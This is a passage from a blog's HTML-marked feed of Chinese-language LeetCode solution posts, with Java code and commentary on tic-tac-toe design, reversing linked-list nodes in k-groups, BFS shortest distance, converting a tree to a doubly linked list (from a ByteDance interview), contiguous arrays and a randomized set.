bdig = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Player &#123;player&#125; makes a move at (&#123;row&#125;, &#123;col&#125;).</span></span><br><span class="line"><span class="comment">        <span class="doctag">@param</span> row The row of the board.</span></span><br><span class="line"><span class="comment">        <span class="doctag">@param</span> col The column of the board.</span></span><br><span class="line"><span class="comment">        <span class="doctag">@param</span> player The player, can be either 1 or 2.</span></span><br><span class="line"><span class="comment">        <span class="doctag">@return</span> The current winning condition, can be either:</span></span><br><span class="line"><span class="comment">                0: No one wins.</span></span><br><span class="line"><span class="comment">                1: Player 1 wins.</span></span><br><span class="line"><span class="comment">                2: Player 2 wins. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span> player)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> toAdd = player == <span class="number">1</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        rows[row] += toAdd;</span><br><span class="line">        cols[col] += toAdd;</span><br><span class="line">        <span class="keyword">if</span>(row == col)</span><br><span class="line">            dig += toAdd;</span><br><span class="line">        <span class="keyword">if</span>(row + col == n - <span class="number">1</span>)</span><br><span class="line">            bdig += toAdd;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(Math.abs(rows[row]) == n || Math.abs(cols[col]) == n || Math.abs(dig) == n || Math.abs(bdig) == n)</span><br><span class="line">            <span class="keyword">return</span> player;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一道很典型的设计题，关键在于抓住问题的本质，算法的优化都是先想出比较暴力一点的办法解决问题，再精简掉不必要的部分</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode25 Reverse Nodes in K Groups</title>
      <link href="/2019/11/04/Leetcode25-Reverse-Nodes-in-K-Groups/"/>
      <url>/2019/11/04/Leetcode25-Reverse-Nodes-in-K-Groups/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a linked list, reverse the nodes of a linked list k at a time and return its modified list.</p><p>k is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is.</p><p>Example:</p><p>Given this linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5</p><p>For k = 2, you should return: 2-&gt;1-&gt;4-&gt;3-&gt;5</p><p>For k = 3, you should return: 3-&gt;2-&gt;1-&gt;4-&gt;5</p><p>Note:</p><ul><li>Only constant extra memory is allowed.</li><li>You may not alter the values in the list’s nodes, only nodes itself may be changed.<a id="more"></a><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2>反转链表的进化版本，每K个分成一组进行反转，最后再连起来，递归可解，每次返回反转后的链表头，注意循环条件，如果找不到K个不反转，直接返回原来的序列，代码如下:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode cur = head;</span><br><span class="line">    ListNode start = head;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">        cur = cur.next;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(count == k &amp;&amp; cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            ListNode prev = reverseKGroup(cur.next, k);</span><br><span class="line">            head = cur;</span><br><span class="line">            cur = start;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">                ListNode tmp = cur.next;</span><br><span class="line">                cur.next = prev;</span><br><span class="line">                prev = cur;</span><br><span class="line">                cur = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>十分常见的链表题，leetcode 25题老题目了，虽然是hard但是熟记规律也不难掌握，可以多写几遍，这样递归以及反转链表就能掌握得比较透彻了，如果面试问到这题而不会的话是很不应该的。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> LinkedList </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode317-Shortest-Distance-from-All-Buildings</title>
      <link href="/2019/11/04/Leetcode317-Shortest-Distance-from-All-Buildings/"/>
      <url>/2019/11/04/Leetcode317-Shortest-Distance-from-All-Buildings/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>You want to build a house on an empty land which reaches all buildings in the shortest amount of distance. You can only move up, down, left and right. You are given a 2D grid of values 0, 1 or 2, where:</p><ul><li>Each 0 marks an empty land which you can pass by freely.</li><li>Each 1 marks a building which you cannot pass through.</li><li>Each 2 marks an obstacle which you cannot pass through.<a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Input: [[1,0,2,0,1],[0,0,0,0,0],[0,0,1,0,0]]</span><br><span class="line"></span><br><span class="line">1 - 0 - 2 - 0 - 1</span><br><span class="line">|   |   |   |   |</span><br><span class="line">0 - 0 - 0 - 0 - 0</span><br><span class="line">|   |   |   |   |</span><br><span class="line">0 - 0 - 1 - 0 - 0</span><br><span class="line"></span><br><span class="line">Output: 7 </span><br><span class="line"></span><br><span class="line">Explanation: Given three buildings at (0,0), (0,4), (2,2), and an obstacle at (0,2),</span><br><span class="line">             the point (1,2) is an ideal empty land to build a house, as the total </span><br><span class="line">             travel distance of 3+3+1=7 is minimal. So return 7.</span><br></pre></td></tr></table></figure></li></ul><p>Note:<br>There will be at least one building. If it is not possible to build such house according to the above rules, return -1.</p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>题目要求找到一个点，使得其到所有building也就是标记为1的点的距离和最小，距离的定义是上下左右移动的距离，学名为Hamilton距离，这是一道非常典型的BFS题，对每个building依次进行BFS即可，不过需要注意的是，有的点只能到一些building到达不了全部building，我们在做BFS的时候，最后可以将visited和grid进行比较，如果发现有点是可以经过却没有visit则说明该点从这个building不可达，距离设为无穷大，剔除即可。</p><p>代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] dx = &#123;<span class="number">1</span>,-<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[] dy = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,-<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">shortestDistance</span><span class="params">(<span class="keyword">int</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(grid.length == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] dis = <span class="keyword">new</span> <span class="keyword">int</span>[grid.length][grid[<span class="number">0</span>].length];</span><br><span class="line">    n = grid.length;</span><br><span class="line">    m = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(grid[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span>[] start = &#123;i, j&#125;;</span><br><span class="line">                BFS(grid, dis, start);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(grid[i][j] == <span class="number">0</span>)</span><br><span class="line">                min = Math.min(min, dis[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> min == Integer.MAX_VALUE ? -<span class="number">1</span> : min;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span>[][] grid, <span class="keyword">int</span>[][] dis, <span class="keyword">int</span>[] start)</span></span>&#123;</span><br><span class="line">    Queue&lt;<span class="keyword">int</span>[]&gt; q = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    q.add(start);</span><br><span class="line">    <span class="keyword">int</span>[][] visited = <span class="keyword">new</span> <span class="keyword">int</span>[n][m];</span><br><span class="line">    <span class="keyword">int</span> dist = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    visited[start[<span class="number">0</span>]][start[<span class="number">1</span>]] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">    <span class="keyword">int</span> nextcount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x = q.peek()[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> y = q.peek()[<span class="number">1</span>];</span><br><span class="line">        q.poll();</span><br><span class="line">        dis[x][y] += dist;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> newx = x + dx[j];</span><br><span class="line">            <span class="keyword">int</span> newy = y + dy[j];</span><br><span class="line">            <span class="keyword">if</span>(newx &lt; <span class="number">0</span> || newx &gt;= n || newy &lt; <span class="number">0</span> || newy &gt;= m)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span>(visited[newx][newy] == <span class="number">0</span> &amp;&amp; grid[newx][newy] == <span class="number">0</span> &amp;&amp; dis[newx][newy] != Integer.MAX_VALUE)&#123;</span><br><span class="line">                nextcount++;</span><br><span class="line">                <span class="keyword">int</span>[] point = &#123;newx,newy&#125;;</span><br><span class="line">                q.add(point);</span><br><span class="line">                visited[newx][newy] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        count = nextcount;</span><br><span class="line">        dist++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[i][j] == <span class="number">0</span> &amp;&amp; grid[i][j] == <span class="number">0</span>)</span><br><span class="line">                dis[i][j] = Integer.MAX_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总结下，这是一道Leetcode Hard，不过只要熟练掌握BFS就可以轻松搞定，本题就当给自己记录一份BFS的模板，属于公司面试、笔试高频题，我在Mathwork OA的时候就做到过此题的变种，需要熟练掌握，bug free</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> BFS </tag>
            
            <tag> Mathwork </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树中序搜索转双向链表——Bytedance的一条面试题</title>
      <link href="/2019/10/29/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%BA%8F%E6%90%9C%E7%B4%A2%E8%BD%AC%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E2%80%94%E2%80%94Bytedance%E7%9A%84%E4%B8%80%E6%9D%A1%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2019/10/29/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%BA%8F%E6%90%9C%E7%B4%A2%E8%BD%AC%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E2%80%94%E2%80%94Bytedance%E7%9A%84%E4%B8%80%E6%9D%A1%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前出于无聊投了一次Bytedance的后端校招，刚刚收到一面，前面聊项目还是十分愉快的，到了算法部分，遇到了一个不是很常规的题目，很遗憾，当时并没有解出来，体现了我对于陌生题目的思考速度的欠缺，以及心态可能还是不够稳定，不过这也展现了宇宙条手撕代码的难度，居然会出LeetCode上没有的题(Leetcode114有一点相似，但并不完全一样)特此记录分享一下。</p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目其实挺有意思，二叉树和双向链表很相像(说实话在此之前从来没有注意过这一点)，都是有两个指针指向两个不同的地方，要求将二叉树的中序遍历转换为双向链表，原地转换，不允许借助辅助空间。<br><a id="more"></a><br>我在geekforgeek上居然找到了这一题的图，大概是这个样子的</p><p><img src="https://www.geeksforgeeks.org/wp-content/uploads/tree-to-list.png"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>二叉树的题目，绝大多数情况下都是递归，不过怎么递归是关键，当时我纠结半天没有想出来的地方，在于我有点纠结递归返回什么，怎么返回，后来发现无所谓，直接返回自己就可以，写个makeList这种函数，将左右当做黑盒，直接返回本身节点，上一层节点要调用的时候，应该找左边的最后一个节点，以及右边的第一个节点，也就是说将寻找节点的任务交给上一层。</p><p>具体代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TreeNode <span class="title">makeList</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    TreeNode prev = makeList(root.left);</span><br><span class="line">    <span class="comment">//每次都默认左边右边都已经是一个构造好了的双向链表</span></span><br><span class="line">    <span class="comment">//左边就找最右的节点，建立与当前节点的联系</span></span><br><span class="line">    <span class="keyword">if</span>(prev != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(prev.right != <span class="keyword">null</span>)</span><br><span class="line">            prev = prev.right;</span><br><span class="line">        prev.right = root;</span><br><span class="line">    &#125;</span><br><span class="line">    root.left = prev;</span><br><span class="line">    <span class="comment">//右边则找第一个节点</span></span><br><span class="line">    TreeNode next = makeList(root.right);</span><br><span class="line">    <span class="keyword">if</span>(next != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(next.left != <span class="keyword">null</span>)</span><br><span class="line">            next = next.left;</span><br><span class="line">        next.left = root;</span><br><span class="line">    &#125;</span><br><span class="line">    root.right = next;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="感想"><a href="#感想" class="headerlink" title="感想"></a>感想</h2><p>虽然完了之后琢磨了下，很快解了出来，但是面试的时候没做出来，终归还是凉凉，面试的时候个人实力能发挥50%就算很好的了，深有体会，只能不断提高个人实力和做题的熟练度了，关键是思路与方法，例如这题是一个很明显的递归，弄清递归条件，把递归其实可以就当做一个黑盒使用，这类问题自然也迎刃而解了，现场没想出来这种不是很难的题目，归根结底，还是因为菜，菜有时不光是技术能力，也包括临场应变和心态，多多努力吧，唉~~</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LinkedList </tag>
            
            <tag> Tree </tag>
            
            <tag> Bytedance </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode525 Contiguous Array</title>
      <link href="/2019/10/28/Leetcode525-Contiguous-Array/"/>
      <url>/2019/10/28/Leetcode525-Contiguous-Array/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Given a binary array, find the maximum length of a contiguous subarray with equal number of 0 and 1.<br><a id="more"></a><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,1]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: [0, 1] is the longest contiguous subarray with equal number of 0 and 1.</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [0,1,0]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: [0, 1] (or [1, 0]) is a longest contiguous subarray with equal number of 0 and 1.</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这是一个题目描述得特别简单的题，不过思路比较tricky，题目要求求一个只含0和1的数组中最长的，含有相同数量0和1的子数组的长度，暴力法O(n^2)遍历所有子数组，这个不难想到，不过题目说数组长度会有50000，有大概率会超时。</p><p>一个Tricky的方法是遍历数组一次，设置一个count，每次遇到1则加一，遇到0则减一，如果同样的count出现两次，则两个index之间的0和1出现次数相等，有一点统计出现一半以上的数字那道题的感觉，也是遇到+1，没有遇到-1，Leetcode官方题解里有一个图很好地说明了这个intuition的原理:</p><p><img alt src="https://leetcode.com/problems/contiguous-array/Figures/535_Contiguous_Array.PNG"></p><p>这里我们需要用一个HashMap存储count与第一次出现该count的index的对应关系，便于日后查找, 具体代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMaxLength</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    map.put(<span class="number">0</span>,-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        sum += nums[i] == <span class="number">1</span> ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(sum))</span><br><span class="line">            res = Math.max(res, i - map.get(sum));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            map.put(sum, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一个描述十分简单的题目，很有意思的一个小技巧，从O(N^2)到O(N)的优化，挺适合作为面试题，不过如果以前没有见过这个技巧，可能很难再面试时期想出，所以，还是要多刷题呀~~</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Algorithms </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode380 Insert Delete GetRandom O(1)</title>
      <link href="/2019/10/27/Leetcode380-Insert-Delete-GetRandom-O1/"/>
      <url>/2019/10/27/Leetcode380-Insert-Delete-GetRandom-O1/</url>
      
        <content type="html"><![CDATA[<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>Design a data structure that supports all following operations in average O(1) time.</p><p>insert(val): Inserts an item val to the set if not already present.<br>remove(val): Removes an item val from the set if present.<br>getRandom: Returns a random element from current set of elements. Each element must have the same probability of being returned.<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// Init an empty set.</span><br><span class="line">RandomizedSet randomSet = new RandomizedSet();</span><br><span class="line"></span><br><span class="line">// Inserts 1 to the set. Returns true as 1 was inserted successfully.</span><br><span class="line">randomSet.insert(1);</span><br><span class="line"></span><br><span class="line">// Returns false as 2 does not exist in the set.</span><br><span class="line">randomSet.remove(2);</span><br><span class="line"></span><br><span class="line">// Inserts 2 to the set, returns true. Set now contains [1,2].</span><br><span class="line">randomSet.insert(2);</span><br><span class="line"></span><br><span class="line">// getRandom should return either 1 or 2 randomly.</span><br><span class="line">randomSet.getRandom();</span><br><span class="line"></span><br><span class="line">// Removes 1 from the set, returns true. Set now contains [2].</span><br><span class="line">randomSet.remove(1);</span><br><span class="line"></span><br><span class="line">// 2 was already in the set, so return false.</span><br><span class="line">randomSet.insert(2);</span><br><span class="line"></span><br><span class="line">// Since 2 is the only number in the set, getRandom always return 2.</span><br><span class="line">randomSet.getRandom();</span><br></pre></td></tr></table></figure></p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这是一道很有意思的设计问题，美国的面试中这种设计问题并不少见，主要考察对数据结构的灵活运用与组合，一般涉及到两个数据结构的组合。</p><p>题意十分简单，设计一个数据结构，RandomSet随机集合，支持O(1)时间的插入、删除和获取随机值的操作。</p><p>前两个操作十分简单，用HashMap或者HashSet即可，O(1)的随机获取，可以使用顺序表，Java里是ArrayList，C++里是vector，所以我们应该利用这两个的组合来设计RandomSet。</p><p>一个显然的思路是用HashMap存val与ArrayList里val的index的对应关系，获取随机数时再用ArrayList， 不过如果直接这样写会报错，因为每次删除数据时ArrayList的长度会改变，HashMap里存储的index就失去了效果，然而如果每次删除某个Index将后面的所有的index - 1，再在HashMap里都修改一遍，则时间复杂度就不再是O(1)了，那么有没有什么更好的办法。</p><p>这里有一个比较Tricky的办法，也是我个人认为这道题的灵魂所在，因为这道题本质是一个Set，所以数字的顺序我们并不关心，我们就在删除时把所需要删除的元素与ArrayList里最后一个元素交换，然后每次默认只删除最后一个元素，这样其他index则不再改变，Map每次只修改原先的LastIndex所对应的val的index即可。</p><p>Talk is Cheap， Show your the code:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RandomizedSet</span> </span>&#123;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; indexMap;</span><br><span class="line">    ArrayList&lt;Integer&gt; set;</span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RandomizedSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        indexMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        set = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Inserts a value to the set. Returns true if the set did not already contain the specified element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(indexMap.containsKey(val))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        indexMap.put(val, set.size());</span><br><span class="line">        set.add(val);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/** Removes a value from the set. Returns true if the set contained the specified element. */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!indexMap.containsKey(val))</span><br><span class="line">            <span 